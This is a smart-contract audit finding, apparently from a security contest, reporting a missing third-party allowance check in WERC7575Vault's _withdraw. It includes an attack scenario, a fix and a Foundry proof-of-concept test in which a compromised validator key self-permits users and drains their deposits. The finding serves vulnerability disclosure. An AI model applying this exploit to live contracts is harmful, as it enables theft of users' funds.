  "title": "Missing third-party authorization check in `WERC7575Vault::_withdraw` enables a malicious validator to drain all user assets from the vault",
  "severity": "medium",
  "validity": "valid",
  "quality": "sufficient",
  "user_handle": "romans",
  "body": "## Finding description and impact\n\n### Root Cause\n\nThe internal `_withdraw` function in `WERC7575Vault` (called by both `withdraw()` and `redeem()`) only enforces the self-allowance mechanism:\n[WERC7575Vault.sol#L407](https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575Vault.sol#L407)\n```solidity\n_shareToken.spendSelfAllowance(owner, shares);\n```\nIt completely omits the standard third-party authorization check that should be performed when `msg.sender != owner`:\n```solidity\nif (msg.sender != owner) {\n    _shareToken.spendAllowance(owner, msg.sender, shares);\n}\n```\nBecause of this omission, any caller can withdraw/redeem on behalf of an owner as long as that owner has previously executed a self-permit (i.e., allowance(owner, owner) > 0).\nThe validator is the only entity capable of signing such self-permits on behalf of users.\n[WERC7575ShareToken.sol#L419-L422](https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L419-L422)\n```solidity\nif (owner == spender) {\n    if (signer != _validator) {\n        revert ERC2612InvalidSigner(signer, owner);\n    }\n} \n```\n\n### Attack Scenario\n\n1. Validator private key is compromised (phishing, insider attack, etc.).\n2. Attacker uses the validator key to sign and to call `permit(owner, owner, type(uint256).max, ...)` for every user.\n3. Attacker then calls `vault.withdraw(assets, attacker, user)` or `vault.redeem(shares, attacker, user)` for each user in the same block.\n4. All calls succeed: self-allowance is spent, shares are burned, and assets are transferred to the attacker.\n5. This can be done before the owner reacts and transfers validator rights to a new address by calling `WERC7575ShareToken::setValidator`\n\n### Impact\n\n- **Total loss of funds:** A single successful validator compromise allows draining 100 % of vault assets.\n- Validator is an acknowledged single point of failure (explicitly documented in `KNOWN_ISSUES.md`), but this bug removes **the last line of defense:** even  with a compromised key, third-party withdrawals should still require explicit user approval.\n- **Extremely high attacker motivation:** Potential gain is in the hundreds of millions of dollars (or more, depending on TVL). This creates enormous  financial incentive for sophisticated actors to target the validator key via phishing, social engineering, malware, or insider collusion.\n- While validator key compromise is considered a low-probability event under strong operational security, the combination of low probability and **catastrophic impact** (full fund drainage) still warrants Medium severity.\n\n## Recommended Mitigation\n\nAdd the standard third-party authorization check in `_withdraw`:\n```solidity\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    // Keep existing self-allowance logic\n    _shareToken.spendSelfAllowance(owner, shares);\n\n    // ← ADD THIS CHECK\n    if (msg.sender != owner) {\n        uint256 allowed = _shareToken.allowance(owner, msg.sender);\n        if (allowed != type(uint256).max) {\n            _shareToken.spendAllowance(owner, msg.sender, shares);\n        }\n    }\n\n    // ... burn + transfer assets\n}\n```",
  "proof_of_concept": "Add this test function to `test/AuditReproduction.t.sol` and run `forge test --mt test_PoC_MaliciousValidatorStealsAllUserAssets -vvv`:\n\n```solidity\nfunction test_PoC_MaliciousValidatorStealsAllUserAssets() public {\n        console.log(\"=== PoC: Malicious Validator Steals All User Assets via Missing Authorization in _withdraw ===\");\n\n        // Step 1: Setup WERC7575ShareToken and WERC7575Vault\n        WERC7575ShareToken shareToken = new WERC7575ShareToken(\"Test Share\", \"TSH\");\n        WERC7575Vault vault = new WERC7575Vault(address(asset), shareToken);\n        shareToken.registerVault(address(asset), address(vault));\n\n        // Step 2: Set KYC for users and validator\n        address user1 = makeAddr(\"user1\");\n        address user2 = makeAddr(\"user2\");\n        address user3 = makeAddr(\"user3\");\n        shareToken.setKycVerified(user1, true);\n        shareToken.setKycVerified(user2, true);\n        shareToken.setKycVerified(user3, true);\n\n        uint256 validatorPk = 0xA11CE;\n        address validator = vm.addr(validatorPk);\n        shareToken.setValidator(validator);\n\n        // Step 3: Multiple users deposit assets (100e18 each)\n        uint256 depositAmount = 100e18;\n        address[] memory users = new address[](3);\n        users[0] = user1;\n        users[1] = user2;\n        users[2] = user3;\n\n        console.log(\"====================================================================================\");\n\n        for (uint256 i = 0; i < 3; ++i) {\n            asset.mint(users[i], depositAmount);\n            vm.prank(users[i]);\n            asset.approve(address(vault), depositAmount);\n            vm.prank(users[i]);\n            vault.deposit(depositAmount, users[i]);\n            assertEq(shareToken.balanceOf(users[i]), depositAmount);\n            console.log(\"User %s deposited %e assets\", users[i], depositAmount);\n        }\n\n        console.log(\"====================================================================================\");\n\n        // Total shares minted: 300e18\n        assertEq(shareToken.totalSupply(), 300e18);\n\n        // Step 4: Malicious validator sets self-allowance for each user via permit()\n        console.log(\"Malicious validator sets max self-allowance for all users\");\n\n        bytes32 PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n        for (uint256 i = 0; i < 3; ++i) {\n            address targetUser = users[i];\n            uint256 nonce = shareToken.nonces(targetUser);\n            uint256 deadline = block.timestamp + 1 days;\n            bytes32 structHash = keccak256(abi.encode(\n                PERMIT_TYPEHASH,\n                targetUser,  // owner\n                targetUser,  // spender (self)\n                type(uint256).max,\n                nonce,\n                deadline\n            ));\n            bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n            // Execute permit as anyone (since public)\n            shareToken.permit(targetUser, targetUser, type(uint256).max, deadline, v, r, s);\n\n            assertEq(shareToken.allowance(targetUser, targetUser), type(uint256).max);\n            console.log(\"Max self-allowance set for user %s\", targetUser);\n        }\n\n        console.log(\"====================================================================================\");\n\n        // Step 5: Malicious validator steals all assets by calling withdraw() for each user\n        address attacker = makeAddr(\"attacker\");\n        console.log(\"Malicious validator (attacker) steals all assets from users\");\n\n        for (uint256 i = 0; i < 3; ++i) {\n            address targetUser = users[i];\n            vm.prank(attacker);\n            vault.withdraw(depositAmount, attacker, targetUser);  // Attacker as receiver, user as owner\n\n            assertEq(asset.balanceOf(attacker), depositAmount * (i + 1));\n            assertEq(shareToken.balanceOf(targetUser), 0);\n            console.log(\"Stolen %e assets from user %s\", depositAmount, targetUser);\n        }\n\n        console.log(\"====================================================================================\");\n\n        // Verify total theft\n        assertEq(asset.balanceOf(attacker), 300e18);\n        console.log(\"Malicious validator (attacker) stole all assets from users\");\n\n        assertEq(shareToken.totalSupply(), 0);\n        console.log(\"All users shares are burned\");\n\n        console.log(\"====================================================================================\");\n\n        console.log(\"=== PoC SUCCESS: Malicious validator stole all assets from the vault ===\");\n    }\n```",
